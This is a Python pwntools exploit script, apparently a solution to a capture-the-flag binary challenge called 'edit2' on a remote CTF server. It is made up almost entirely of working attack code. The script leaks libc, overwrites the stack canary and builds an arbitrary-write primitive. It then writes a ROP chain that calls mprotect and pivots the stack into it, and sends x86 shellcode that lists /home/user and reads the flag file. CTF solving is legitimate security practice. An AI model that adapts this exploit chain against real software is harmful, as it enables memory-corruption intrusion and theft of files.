from pwn import *
#context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './setup'
TARGET = './edit2'
HOST = 'challs.ctf.sekai.team'
PORT = 4002

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET)
		# return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()

r.sendlineafter(b'> ', b'1')
r.sendafter(b'to: ', b'a'*8)

# leak libc
r.sendlineafter(b'> ', b'1')
r.recvuntil(b'a' * 8)
leak = u64(r.recv(6).ljust(8, b'\x00'))
base = leak - 0xed957
dbg('base')

# pointer to canary, return address to loop
r.sendafter(b'name: ', p64(base - 0x2a00+0x168)+b'a'*0x48+b'b'*8 + b'c'*8+ b'\x10')

# overwrite canary
r.sendafter(b'Data: ', b'b'*8)

def aaw(where, what):
	r.sendlineafter(b'> ', b'1')
	r.sendafter(b'to: ', b'a'*8)
	r.sendlineafter(b'> ', b'1')
	r.recvuntil(b'c' * 8)
	leak = u64(r.recv(6).ljust(8, b'\x00'))
	r.sendafter(b'name: ', p64(where)+b'a'*0x48+b'b'*8 + b'c'*8+ b'\x10')
	r.sendafter(b'Data: ', p64(what))
	return leak

pivot_to = base - 0x2a00- 0x200
rdi = base + 0x001bb5a2
rsi = base + 0x001becf7
rdx = base + 0x00120272
rax = base + 0x0011ef29
syscall = base +  0x00095196
leave = base + 0x0005a1ac

leak = aaw(pivot_to + 0x08, rdi)
pie = leak - 0x1c1a
dbg('pie')

# build shellcode rop
aaw(pivot_to + 0x10, pivot_to & 0xfffffffffffff000)
aaw(pivot_to + 0x18, rsi)
aaw(pivot_to + 0x20, 0x1000)
aaw(pivot_to + 0x28, rdx)
aaw(pivot_to + 0x30, 7)
aaw(pivot_to + 0x38, rax)
aaw(pivot_to + 0x40, 10)
aaw(pivot_to + 0x48, syscall)

aaw(pivot_to + 0x50, rdi)
aaw(pivot_to + 0x58, 0)
aaw(pivot_to + 0x60, rsi)
aaw(pivot_to + 0x68, pivot_to & 0xfffffffffffff000)
aaw(pivot_to + 0x70, rdx)
aaw(pivot_to + 0x78, 0x200)
aaw(pivot_to + 0x80, rax)
aaw(pivot_to + 0x88, 0)
aaw(pivot_to + 0x90, syscall)
aaw(pivot_to + 0x98, pivot_to & 0xfffffffffffff000)

if args.D:
	debug(r, [0x1b52])
	#debug(r, [0x180a])

# overwrite rbp to pivot to our rop 
r.sendlineafter(b'> ', b'1')
r.sendafter(b'to: ', b'a'*8)
r.sendlineafter(b'> ', b'1')
r.sendafter(b'name: ', b'a'*0x50+b'b'*8 + flat(pivot_to, leave))

# overwrite rbo to pivot to our rop 
# use open(05), getdents(8d), mmap2(c0) to read directory -> flag via x86 system call
payload = asm('''
	mov rax, 0xc0
	mov rbx, 0xbeef000
	mov rcx, 0x1000
	mov rdx, 7
	mov rsi, 0x22
	mov rdi, -1
	int 0x80

	mov rax, 5
	mov rbx, 0xbeef000
	mov rcx, {}
	mov qword ptr [rbx], rcx
	mov rcx, {}
	mov qword ptr [rbx+8], rcx
	mov rcx, 0
	mov rdx, 0
	int 0x80

	mov rbx, rax
	mov rax, 0x8d
	mov rcx, 0xbeef000
	mov rdx, 0x1000
	int 0x80
	
	mov rdi, 1
	mov rsi, 0xbeef000
	mov rdx, 0x400
	mov rax, 1
	syscall
	
	mov rdi, 0
	mov rsi, 0xbeef000
	mov rdx, 0x400
	mov rax, 0
	syscall

	mov rax, 5
	mov rbx, 0xbeef000
	mov rcx, 0
	mov rdx, 0
	int 0x80

	mov rdi, rax
	mov rsi, 0xbeef000
	mov rdx, 0x400
	mov rax, 0
	syscall
	
	mov rdi, 1
	mov rsi, 0xbeef000
	mov rdx, 0x400
	mov rax, 1
	syscall
	nop
'''.format(u64(b"/home".ljust(8, b'\x2f')), u64(b"/user".ljust(8, b'\x2f'))))
r.send(payload)
context.log_level = 'debug'
r.recvuntil(b'Wizard')
r.recvuntil(b'Wizard\n\x1b\x5b\x30\x6d')
dents = r.recv(0x400).split(b'\x00')
for f in dents:
    if f != b'':
        print(f)
    if b'.txt' in f:
        r.sendline(f'/home/user/{f.decode()}\x00'.encode())

# /home/user/85c6ead8489c814ccc024c7054edf8e4.txt
r.interactive()
r.close()
